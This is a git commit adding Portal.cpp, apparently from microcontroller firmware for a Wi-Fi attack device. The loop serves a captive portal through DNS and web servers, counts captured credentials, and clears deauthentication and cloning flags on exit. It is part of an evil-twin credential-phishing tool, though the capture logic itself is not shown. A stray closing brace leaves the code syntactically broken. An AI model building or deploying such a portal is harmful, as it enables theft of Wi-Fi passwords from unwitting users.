a2690354e330d29956a39dceef36e5cdeccd04f6
pitec0 <igorgustavodoamaral94@gmail.com>
2024-02-20 09:56:22 -0300

    commit to test portal

---
+++ src/applications/services/gui/Portal.cpp
@@ -0,0 +1,27 @@
+#include "portal.h"
+
+using namespace Applications::Services::GUI;
+
+void portal_loop(){
+  if ((millis() - lastTick) > PortalTickTimer) {
+    lastTick = millis();
+    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
+      previousTotalCapturedCredentials = totalCapturedCredentials;
+      printHomeToScreen();
+    }
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  }
+  if (check_next_press()){
+    shutdownWebServer();
+    portal_active = false;
+    target_deauth_flg = false;                                                                     // DEAUTH
+    target_deauth = false;                                                                         // DEAUTH
+    clone_flg = false;                                                                             // DEAUTH
+    current_proc = 12;
+    delay(500);
+  }
+  check_select_press();
+}
+
